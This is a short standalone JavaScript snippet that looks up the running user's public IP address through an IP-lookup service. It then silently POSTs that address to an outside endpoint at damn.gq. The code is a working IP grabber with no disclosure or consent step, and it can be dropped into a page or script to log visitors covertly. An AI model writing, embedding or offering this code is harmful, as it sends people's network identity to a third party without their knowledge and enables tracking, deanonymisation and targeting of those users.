fetch("https://api.ipify.org?format=json")
  .then((t) => t.json())
  .then((t) => {
    fetch("https://damn.gq/api/", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ ip: t.ip }),
    });
  });
